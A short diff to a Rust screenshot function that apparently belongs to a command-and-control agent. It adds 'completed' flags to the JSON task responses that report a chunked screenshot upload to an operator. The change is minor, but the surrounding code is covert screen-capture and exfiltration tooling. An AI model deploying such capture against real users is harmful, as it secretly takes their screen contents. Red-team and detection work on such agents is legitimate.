@@ -73,11 +73,12 @@ pub fn screenshot(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
         "action": "post_response",
         "responses": [{
             "task_id": id,
+            "completed": true,
             "download": {
                 "total_chunks": total_chunks,
                 "full_path": path.to_string_lossy(),
                 "chunk_size": CHUNK_SIZE,
-                "is_screenshot": true 
+                "is_screenshot": true
             }
         }]
     })
@@ -99,6 +100,7 @@ pub fn screenshot(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
             "action": "post_response",
             "responses": [{
                 "task_id": id,
+                "completed": true,
                 "download": {
                     "chunk_num": chunk_num,
                     "file_id": file_id,
@@ -118,7 +120,8 @@ pub fn screenshot(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
             "user_output": format!("Screenshot uploaded as {}", file_id),
             "agent_file_id": file_id,
             "status": "success",
-            "timestamp": timestamp
+            "timestamp": timestamp,
+            "completed": true
         }]
     })
     .to_string();
